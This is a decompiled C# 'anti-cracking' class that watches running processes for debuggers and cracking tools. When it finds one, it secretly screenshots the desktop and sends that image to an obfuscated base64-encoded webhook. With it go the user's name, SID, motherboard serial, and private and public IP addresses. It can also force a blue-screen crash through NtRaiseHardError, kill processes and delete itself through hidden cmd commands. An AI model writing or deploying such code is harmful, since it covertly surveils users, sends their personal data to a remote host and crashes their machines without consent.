using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace XRuntime
{
	public static class AntiCrackingWithHook
	{
		public enum Privilege
		{
			SeCreateTokenPrivilege = 1,
			SeAssignPrimaryTokenPrivilege,
			SeLockMemoryPrivilege,
			SeIncreaseQuotaPrivilege,
			SeUnsolicitedInputPrivilege,
			SeMachineAccountPrivilege,
			SeTcbPrivilege,
			SeSecurityPrivilege,
			SeTakeOwnershipPrivilege,
			SeLoadDriverPrivilege,
			SeSystemProfilePrivilege,
			SeSystemtimePrivilege,
			SeProfileSingleProcessPrivilege,
			SeIncreaseBasePriorityPrivilege,
			SeCreatePagefilePrivilege,
			SeCreatePermanentPrivilege,
			SeBackupPrivilege,
			SeRestorePrivilege,
			SeShutdownPrivilege,
			SeDebugPrivilege,
			SeAuditPrivilege,
			SeSystemEnvironmentPrivilege,
			SeChangeNotifyPrivilege,
			SeRemoteShutdownPrivilege,
			SeUndockPrivilege,
			SeSyncAgentPrivilege,
			SeEnableDelegationPrivilege,
			SeManageVolumePrivilege,
			SeImpersonatePrivilege,
			SeCreateGlobalPrivilege,
			SeTrustedCredManAccessPrivilege,
			SeRelabelPrivilege,
			SeIncreaseWorkingSetPrivilege,
			SeTimeZonePrivilege,
			SeCreateSymbolicLinkPrivilege
		}

		public enum NTStatus : uint
		{
			STATUS_SUCCESS = 0u,
			STATUS_WAIT_0 = 0u,
			STATUS_WAIT_1 = 1u,
			STATUS_WAIT_2 = 2u,
			STATUS_WAIT_3 = 3u,
			STATUS_WAIT_63 = 63u,
			STATUS_ABANDONED = 128u,
			STATUS_ABANDONED_WAIT_0 = 128u,
			STATUS_ABANDONED_WAIT_63 = 191u,
			STATUS_USER_APC = 192u,
			STATUS_KERNEL_APC = 256u,
			STATUS_ALERTED = 257u,
			STATUS_TIMEOUT = 258u,
			STATUS_PENDING = 259u,
			STATUS_REPARSE = 260u,
			STATUS_CRASH_DUMP = 278u,
			DBG_EXCEPTION_HANDLED = 65537u,
			DBG_CONTINUE = 65538u,
			STATUS_PRIVILEGED_INSTRUCTION = 3221225622u,
			STATUS_MEMORY_NOT_ALLOCATED = 3221225632u,
			STATUS_BIOS_FAILED_TO_CONNECT_INTERRUPT = 3221225838u,
			STATUS_ASSERTION_FAILURE = 3221226528u
		}

		internal static void Init()
		{
			Thread thread = new Thread(DoWork);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Lowest;
			thread.Start();
		}

		public static void SendMSG(string url, string data)
		{
			WebRequest webRequest = WebRequest.Create(url);
			webRequest.Method = "POST";
			byte[] bytes = Encoding.UTF8.GetBytes(data);
			webRequest.ContentType = "application/json";
			webRequest.ContentLength = bytes.Length;
			Stream requestStream = webRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = webRequest.GetResponse();
			requestStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(requestStream);
			streamReader.Close();
			requestStream.Close();
			response.Close();
		}

		public static void Capture(string path)
		{
			try
			{
				string directoryName = Path.GetDirectoryName(path);
				if (!Directory.Exists(directoryName))
				{
					Directory.CreateDirectory(directoryName);
					File.SetAttributes(directoryName, File.GetAttributes(directoryName) | FileAttributes.Hidden);
				}
				Rectangle bounds = Screen.PrimaryScreen.Bounds;
				Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
				bitmap.Save(path, ImageFormat.Png);
				bitmap.Dispose();
			}
			catch
			{
			}
		}

		public static void SendIMSG(string url, string imagePath)
		{
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_0008: Expected O, but got Unknown
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected O, but got Unknown
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Expected O, but got Unknown
			try
			{
				HttpClient val = new HttpClient();
				try
				{
					MultipartFormDataContent val2 = new MultipartFormDataContent();
					try
					{
						FileStream fileStream = new FileStream(imagePath, FileMode.Open, FileAccess.Read);
						StreamContent val3 = new StreamContent(fileStream);
						val3.Headers.ContentType = new MediaTypeHeaderValue("image/jpeg");
						val2.Add((HttpContent)(object)val3, "file", Path.GetFileName(imagePath));
						HttpResponseMessage result = val.PostAsync(url, (HttpContent)(object)val2).Result;
						result.EnsureSuccessStatusCode();
					}
					finally
					{
						((IDisposable)val2)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch
			{
			}
		}

		public static string CalculateMD5Hash()
		{
			MD5 mD = MD5.Create();
			FileStream inputStream = File.OpenRead(Assembly.GetExecutingAssembly().Location);
			byte[] array = mD.ComputeHash(inputStream);
			return BitConverter.ToString(array).Replace("-", "").ToLower();
		}

		public static string GetMotherBoardSerialNo()
		{
			string result = "";
			try
			{
				ManagementClass managementClass = new ManagementClass("Win32_BaseBoard");
				ManagementObjectCollection instances = managementClass.GetInstances();
				foreach (ManagementBaseObject item in instances)
				{
					result = item["SerialNumber"].ToString();
				}
			}
			catch
			{
			}
			return result;
		}

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern IntPtr RtlAdjustPrivilege(Privilege privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(NTStatus ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		public static void eBSOD()
		{
			bool PreviousValue;
			RtlAdjustPrivilege(Privilege.SeShutdownPrivilege, true, false, out PreviousValue);
			uint Response;
			NtRaiseHardError(NTStatus.STATUS_ASSERTION_FAILURE, 0u, 0u, IntPtr.Zero, 6u, out Response);
		}

		[DllImport("kernel32.dll")]
		internal static extern bool IsDebuggerPresent();

		[DllImport("kernel32.dll")]
		internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		internal static void CrossAppDomainSerializer(string A_0)
		{
			Process.Start(new ProcessStartInfo("cmd.exe", "/c " + A_0)
			{
				CreateNoWindow = true,
				UseShellExecute = false
			});
		}

		public static void DoWork()
		{
			string text = XMutationClass.Key<string>(0);
			string text2 = XMutationClass.Key<string>(1);
			string text3 = XMutationClass.Key<string>(2);
			string text4 = XMutationClass.Key<string>(5);
			string text5 = XMutationClass.Key<string>(7);
			string s = XMutationClass.Key<string>(4);
			string text6 = new Random().Next().ToString();
			string text7 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\" + text6;
			string text8 = text7 + "\\" + text2 + ".jpeg";
			string[] array = XMutationClass.Key<string[]>(8);
			string[] array2 = new string[3]
			{
				"easyanticheat",
				"eac",
				XMutationClass.Key<string>(3)
			};
			while (true)
			{
				Process[] processes = Process.GetProcesses();
				if (Registry.CurrentUser.OpenSubKey("SOFTWARE\\Cheat Engine\\Version Check") != null)
				{
					CrossAppDomainSerializer("START CMD /C \"COLOR 03 && ECHO Cheat engine detected! && PAUSE\" ");
					ProcessStartInfo startInfo = new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
						FileName = "cmd.exe"
					};
					Process.Start(startInfo);
					Process.GetCurrentProcess().Kill();
					Environment.Exit(0);
				}
				Process[] array3 = processes;
				foreach (Process process in array3)
				{
					bool flag = false;
					string[] array4 = array2;
					foreach (string text9 in array4)
					{
						if (process.ProcessName.ToLower().Contains(text9.ToLower()))
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						continue;
					}
					string text10 = process.ProcessName.ToLower();
					string[] array5 = array;
					foreach (string text11 in array5)
					{
						bool isDebuggerPresent = false;
						string text12 = text11.ToLower().Trim();
						string text13 = "COR";
						CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
						string text14 = process.ProcessName.ToLower();
						if (!(text14.Contains(text12) || string.Equals(text14, text12, StringComparison.OrdinalIgnoreCase) || isDebuggerPresent) && !IsDebuggerPresent() && Environment.GetEnvironmentVariable(text13 + "_PROFILER") == null && Environment.GetEnvironmentVariable(text13 + "_ENABLE_PROFILING") == null && (string.IsNullOrEmpty(process.MainWindowTitle) || !process.MainWindowTitle.Equals(text12, StringComparison.OrdinalIgnoreCase)))
						{
							continue;
						}
						int id = process.Id;
						try
						{
							if (text3 == "1")
							{
								if (text4 == "1")
								{
									if (text == "1")
									{
										eBSOD();
										continue;
									}
									Terminator.Kill((uint)id);
									Terminator.Kill((uint)Process.GetCurrentProcess().Id);
									continue;
								}
								CrossAppDomainSerializer("START CMD /C \"COLOR 03 && ECHO " + text5 + " && PAUSE\" ");
								ProcessStartInfo startInfo2 = new ProcessStartInfo
								{
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
									FileName = "cmd.exe"
								};
								Terminator.Kill((uint)id);
								Process.Start(startInfo2);
								if (text == "1")
								{
									eBSOD();
								}
								else
								{
									Terminator.Kill((uint)Process.GetCurrentProcess().Id);
								}
								continue;
							}
							ServicePointManager.Expect100Continue = true;
							ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
							string userName = Environment.UserName;
							string value = WindowsIdentity.GetCurrent().User.Value;
							string motherBoardSerialNo = GetMotherBoardSerialNo();
							string text15 = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
							string text16 = new WebClient
							{
								Proxy = null
							}.DownloadString("https://api.ipify.org/?format=text");
							Capture(text8);
							if (File.Exists(text8))
							{
								string data = string.Concat(new string[3]
								{
									"{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your app !\",\"description\":\" > Private IP : " + text15 + "\\n > Public IP : " + text16 + "\\n > Hwid : " + value + "\\n > Motherboard ID : " + motherBoardSerialNo + "\\n > App MD5 Hash : " + CalculateMD5Hash() + "\\n > Process name : " + Process.GetCurrentProcess().ProcessName + "\\n > Computer name : " + userName + "\\n> Used tool : " + process.ProcessName + "\\n",
									"\",\"color\":0,\"footer\":{\"text\":\"",
									" \"},\"thumbnail\":{\"url\":\"\"}}]}"
								});
								SendIMSG(Encoding.UTF8.GetString(Convert.FromBase64String(s)), text8);
								SendMSG(Encoding.UTF8.GetString(Convert.FromBase64String(s)), data);
							}
							if (text4 == "1")
							{
								if (text == "1")
								{
									eBSOD();
									continue;
								}
								Terminator.Kill((uint)id);
								Terminator.Kill((uint)Process.GetCurrentProcess().Id);
								continue;
							}
							CrossAppDomainSerializer("START CMD /C \"COLOR 03 && ECHO " + text5 + " && PAUSE\" ");
							ProcessStartInfo startInfo3 = new ProcessStartInfo
							{
								WindowStyle = ProcessWindowStyle.Hidden,
								CreateNoWindow = true,
								Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
								FileName = "cmd.exe"
							};
							Terminator.Kill((uint)id);
							Process.Start(startInfo3);
							if (text == "1")
							{
								eBSOD();
							}
							else
							{
								Terminator.Kill((uint)Process.GetCurrentProcess().Id);
							}
						}
						catch
						{
							Terminator.Kill((uint)Process.GetCurrentProcess().Id);
						}
					}
				}
				Thread.Sleep(3000);
			}
		}
	}
}
